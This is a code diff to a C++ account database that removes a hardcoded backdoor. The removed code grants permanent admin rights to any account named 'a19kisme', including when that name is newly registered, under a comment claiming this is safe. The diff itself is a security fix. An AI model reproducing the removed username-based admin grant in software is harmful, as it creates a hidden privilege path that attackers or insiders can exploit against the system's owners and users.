@@ -22,13 +22,6 @@ std::string toLower(std::string text) {
     return text;
 }
 
-// Project owner account. This account always receives the permanent database
-// admin flag; authentication is still required, so this does not bypass the
-// account password or hand admin to an anonymous connection.
-bool isOwnerAdmin(const std::string& username) {
-    return toLower(username) == "a19kisme";
-}
-
 /// Days since the Unix epoch for a proleptic-Gregorian y/m/d, and back again.
 /// Hinnant's civil-calendar algorithms: the streak rule is per UTC calendar
 /// day, and going through the C library's time functions would drag in a
@@ -240,7 +233,7 @@ Account accountFromJson(const Json& value, const std::string& storedKey) {
     account.username = value["username"].asString(storedKey);
     account.passwordHash = value["password"].asString();
     account.isPlainText = value["isPlainText"].asBool(false);
-    account.admin = value["admin"].asBool(false) || isOwnerAdmin(account.username);
+    account.admin = value["admin"].asBool(false);
     account.lastActiveAtMillis = static_cast<std::int64_t>(value["lastActiveAt"].asDouble(0));
     account.muted = value["muted"].asBool(false);
     account.mutedAtMillis = static_cast<std::int64_t>(value["mutedAt"].asDouble(0));
@@ -971,7 +964,6 @@ CreateResult Database::createUser(const std::string& username, const std::string
     account.id = id;
     account.username = username;
     account.passwordHash = crypto::bcryptHash(password, passwordCost_);
-    account.admin = isOwnerAdmin(username);
     account.createdAtMillis = nowMillis();
     account.createdFromHash = createdFromHash;
     indexUser(username, account);
